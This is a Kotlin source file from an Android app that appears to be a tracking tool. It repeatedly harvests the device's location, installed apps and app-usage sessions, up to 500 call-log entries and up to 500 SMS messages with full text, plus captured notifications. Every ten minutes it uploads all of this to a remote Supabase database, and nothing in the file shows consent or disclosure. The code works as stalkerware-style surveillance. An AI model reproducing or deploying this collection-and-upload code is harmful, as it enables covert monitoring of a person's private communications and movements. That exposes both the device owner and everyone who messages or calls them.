package com.lvhonyua.apptrack.data

import android.annotation.SuppressLint
import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.os.Build
import android.provider.CallLog
import android.provider.Telephony
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import io.github.jan.supabase.SupabaseClient
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.postgrest.postgrest
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Date
import java.util.Locale
import kotlin.time.Duration.Companion.minutes

object LocationRepository {
    private var settingsManager: SettingsManager? = null
    private var supabaseClient: SupabaseClient? = null
    private var dbHelper: LocalDbHelper? = null
    private var currentDeviceId: String = "unknown"
    private var currentDeviceName: String = "unknown"
    
    private val _locationRecords = MutableStateFlow<List<LocationRecord>>(emptyList())
    val locationRecords = _locationRecords.asStateFlow()

    private val _isTracking = MutableStateFlow(false)
    val isTracking = _isTracking.asStateFlow()

    private val repositoryScope = CoroutineScope(Dispatchers.IO)
    private var periodicSyncJob: Job? = null

    fun getSdf() = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

    fun init(context: Context) {
        settingsManager = SettingsManager(context)
        dbHelper = LocalDbHelper(context)
        currentDeviceId = android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
        updateDeviceName(context)
        updateClient()
        refreshLocalRecords()
        
        // 初始同步
        triggerAllSync(context)
        
        // 开启定时同步（每 10 分钟一次）
        startPeriodicSync(context)
    }

    // 暴露给外部，用于手动触发（如从设置返回或回到主页）
    fun triggerAllSync(context: Context) {
        repositoryScope.launch {
            Log.d("LocationRepository", "Triggering full sync scan...")
            scanAndSaveAppInfo(context)
            scanAndSaveAppSessions(context)
            scanAndSaveCallLogs(context)
            scanAndSaveSms(context)
            
            syncLocationsInBatches()
            delay(1000)
            syncAppInfosInBatches()
            delay(1000)
            syncSessionsInBatches()
            delay(1000)
            syncCallsInBatches()
            delay(1000)
            syncSmsInBatches()
            delay(1000)
            syncNotificationsInBatches()
        }
    }

    private fun startPeriodicSync(context: Context) {
        periodicSyncJob?.cancel()
        periodicSyncJob = repositoryScope.launch {
            while (isActive) {
                delay(10.minutes)
                triggerAllSync(context)
            }
        }
    }

    @SuppressLint("MissingPermission")
    fun updateDeviceName(context: Context) {
        val bluetoothName = try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (context.checkSelfPermission(android.Manifest.permission.BLUETOOTH_CONNECT) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    android.bluetooth.BluetoothAdapter.getDefaultAdapter()?.name
                } else null
            } else {
                @Suppress("DEPRECATION")
                android.bluetooth.BluetoothAdapter.getDefaultAdapter()?.name
            }
        } catch (e: Exception) { null }
        currentDeviceName = bluetoothName ?: "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"      
    }

    fun getDeviceId() = currentDeviceId
    fun getDeviceName() = currentDeviceName

    private fun refreshLocalRecords() {
        repositoryScope.launch {
            val records = dbHelper?.getAllRecords() ?: emptyList()
            _locationRecords.value = records
        }
    }

    fun updateClient() {
        val settings = settingsManager ?: return
        if (settings.isConfigured()) {
            try {
                supabaseClient = createSupabaseClient(settings.supabaseUrl, settings.supabaseAnonKey) {
                    install(Postgrest)
                }
            } catch (e: Exception) {
                supabaseClient = null
            }
        }
    }

    fun scanAndSaveAppInfo(context: Context) {
        repositoryScope.launch {
            try {
                val pm = context.packageManager
                val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
                val statsMap = usageStatsManager.queryAndAggregateUsageStats(0L, System.currentTimeMillis())
                val apps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
                val sdf = getSdf()
                apps.forEach { appInfo ->
                    val packageName = appInfo.packageName
                    val installTime = try { sdf.format(Date(pm.getPackageInfo(packageName, 0).firstInstallTime)) } catch (e: Exception) { "Unknown" }
                    val usage = statsMap[packageName]
                    dbHelper?.insertAppInfo(AppInfo(
                        packageName = packageName,
                        appName = appInfo.loadLabel(pm).toString(),
                        installTime = installTime,
                        usageTimeSeconds = (usage?.totalTimeInForeground ?: 0L) / 1000,
                        lastTimeUsed = usage?.lastTimeUsed?.let { if (it > 0) sdf.format(Date(it)) else null },
                        deviceId = currentDeviceId,
                        deviceName = currentDeviceName
                    ))
                }
            } catch (e: Exception) { Log.e("LocationRepository", "AppInfo scan failed") }
        }
    }

    fun scanAndSaveAppSessions(context: Context) {
        repositoryScope.launch {
            try {
                val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
                val calendar = Calendar.getInstance()
                calendar.add(Calendar.HOUR_OF_DAY, -12) 
                val events = usageStatsManager.queryEvents(calendar.timeInMillis, System.currentTimeMillis())
                val pm = context.packageManager
                val sdf = getSdf()
                val openTimeMap = mutableMapOf<String, Long>()
                while (events.hasNextEvent()) {
                    val event = UsageEvents.Event()
                    events.getNextEvent(event)
                    val pkg = event.packageName
                    if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) openTimeMap[pkg] = event.timeStamp
                    else if (event.eventType == UsageEvents.Event.MOVE_TO_BACKGROUND) {
                        openTimeMap[pkg]?.let { start ->
                            val duration = event.timeStamp - start
                            if (duration > 1000) {
                                val name = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
                                dbHelper?.insertSession(AppSessionRecord(
                                    packageName = pkg,
                                    appName = name,
                                    startTime = sdf.format(Date(start)),
                                    durationSeconds = duration / 1000,
                                    deviceId = currentDeviceId,
                                    deviceName = currentDeviceName
                                ))
                            }
                            openTimeMap.remove(pkg)
                        }
                    }
                }
            } catch (e: Exception) { Log.e("LocationRepository", "Sessions scan failed") }
        }
    }

    fun scanAndSaveCallLogs(context: Context) {
        repositoryScope.launch {
            try {
                if (context.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != android.content.pm.PackageManager.PERMISSION_GRANTED) return@launch
                val cursor = context.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC") ?: return@launch
                val sdf = getSdf()
                var count = 0
                while (cursor.moveToNext() && count < 500) {
                    val typeInt = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    dbHelper?.insertCall(CallRecord(
                        number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "Unknown",
                        name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)),
                        type = when (typeInt) { CallLog.Calls.INCOMING_TYPE -> "呼入"; CallLog.Calls.OUTGOING_TYPE -> "呼出"; CallLog.Calls.MISSED_TYPE -> "未接"; else -> "其他" },
                        time = sdf.format(Date(cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)))),
                        durationSeconds = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)),
                        deviceId = currentDeviceId,
                        deviceName = currentDeviceName
                    ))
                    count++
                }
                cursor.close()
            } catch (e: Exception) { Log.e("LocationRepository", "CallLog scan failed") }
        }
    }

    fun scanAndSaveSms(context: Context) {
        repositoryScope.launch {
            try {
                if (context.checkSelfPermission(android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) return@launch
                val cursor = context.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC") ?: return@launch
                val sdf = getSdf()
                var count = 0
                while (cursor.moveToNext() && count < 500) {
                    val typeInt = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                    dbHelper?.insertSms(SmsRecord(
                        address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "Unknown",
                        body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: "",
                        type = if (typeInt == Telephony.Sms.MESSAGE_TYPE_INBOX) "接收" else "发送",
                        time = sdf.format(Date(cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)))),
                        deviceId = currentDeviceId,
                        deviceName = currentDeviceName
                    ))
                    count++
                }
                cursor.close()
            } catch (e: Exception) { Log.e("LocationRepository", "SMS scan failed") }
        }
    }

    // 保存通知并立即触发同步
    fun saveNotification(record: NotificationRecord) {
        repositoryScope.launch {
            dbHelper?.insertNotification(record)
            syncNotificationsInBatches() // 立即同步通知，确保及时性
        }
    }

    private suspend fun syncLocationsInBatches() {
        val client = supabaseClient ?: return
        val settings = settingsManager ?: return
        val unsynced = dbHelper?.getUnsyncedRecords() ?: return
        if (unsynced.isEmpty()) return
        unsynced.chunked(50).forEach { batch ->
            try {
                withTimeout(60000) { client.postgrest.from(settings.tableName).insert(batch) }
                batch.forEach { dbHelper?.markSynced(it.id) }
                refreshLocalRecords()
                delay(200)
            } catch (e: Exception) { Log.e("LocationRepository", "Batch location sync failed") }
        }
    }

    private suspend fun syncAppInfosInBatches() {
        val client = supabaseClient ?: return
        val unsynced = dbHelper?.getUnsyncedAppInfos() ?: return
        if (unsynced.isEmpty()) return
        unsynced.chunked(50).forEach { batch ->
            try {
                withTimeout(60000) { client.postgrest.from("app_info_stats").upsert(batch) { onConflict = "device_id,package_name" } }
                batch.forEach { dbHelper?.markAppSynced(it.id) }
                delay(200)
            } catch (e: Exception) { Log.e("LocationRepository", "Batch app info sync failed") }
        }
    }

    private suspend fun syncSessionsInBatches() {
        val client = supabaseClient ?: return
        val unsynced = dbHelper?.getUnsyncedSessions() ?: return
        if (unsynced.isEmpty()) return
        unsynced.chunked(50).forEach { batch ->
            try {
                withTimeout(60000) { client.postgrest.from("app_session_history").insert(batch) }
                batch.forEach { dbHelper?.markSessionSynced(it.id) }
                delay(200)
            } catch (e: Exception) { Log.e("LocationRepository", "Batch session sync failed") }
        }
    }

    private suspend fun syncCallsInBatches() {
        val client = supabaseClient ?: return
        val unsynced = dbHelper?.getUnsyncedCalls() ?: return
        if (unsynced.isEmpty()) return
        unsynced.chunked(50).forEach { batch ->
            try {
                withTimeout(60000) { client.postgrest.from("call_history").upsert(batch) { onConflict = "device_id,number,time" } }
                batch.forEach { dbHelper?.markCallSynced(it.id) }
                delay(300)
            } catch (e: Exception) { Log.e("LocationRepository", "Batch call sync failed") }
        }
    }

    private suspend fun syncSmsInBatches() {
        val client = supabaseClient ?: return
        val unsynced = dbHelper?.getUnsyncedSms() ?: return
        if (unsynced.isEmpty()) return
        unsynced.chunked(50).forEach { batch ->
            try {
                withTimeout(60000) { client.postgrest.from("sms_history").upsert(batch) { onConflict = "device_id,address,body,time" } }
                batch.forEach { dbHelper?.markSmsSynced(it.id) }
                delay(300)
            } catch (e: Exception) { Log.e("LocationRepository", "Batch sms sync failed") }
        }
    }

    private suspend fun syncNotificationsInBatches() {
        val client = supabaseClient ?: return
        val unsynced = dbHelper?.getUnsyncedNotifications() ?: return
        if (unsynced.isEmpty()) return
        unsynced.chunked(50).forEach { batch ->
            try {
                withTimeout(60000) { client.postgrest.from("notification_history").insert(batch) }
                batch.forEach { dbHelper?.markNotificationSynced(it.id) }
                delay(200)
            } catch (e: Exception) { Log.e("LocationRepository", "Batch notification sync failed") }
        }
    }

    suspend fun validateConnection(url: String, key: String, table: String = "locations"): Result<Unit> {      
        return withContext(Dispatchers.IO) {
            try {
                val tempClient = createSupabaseClient(url, key) { install(Postgrest) }
                withTimeout(15000) { tempClient.postgrest.from(table).select { limit(1) } }
                Result.success(Unit)
            } catch (e: Exception) { Result.failure(e) }
        }
    }

    fun addRecord(record: LocationRecord) {
        repositoryScope.launch {
            val r = record.copy(deviceId = currentDeviceId, deviceName = currentDeviceName)
            val id = dbHelper?.insertRecord(r) ?: return@launch
            refreshLocalRecords()
            syncRecord(r.copy(id = id))
        }
    }

    private suspend fun syncRecord(record: LocationRecord) {
        val client = supabaseClient ?: return
        val settings = settingsManager ?: return
        try {
            client.postgrest.from(settings.tableName).insert(record)
            dbHelper?.markSynced(record.id)
            refreshLocalRecords()
        } catch (e: Exception) { Log.e("LocationRepository", "Single location sync failed") }
    }

    fun setTracking(tracking: Boolean) { _isTracking.value = tracking }
    fun initializeRealm() {}
}
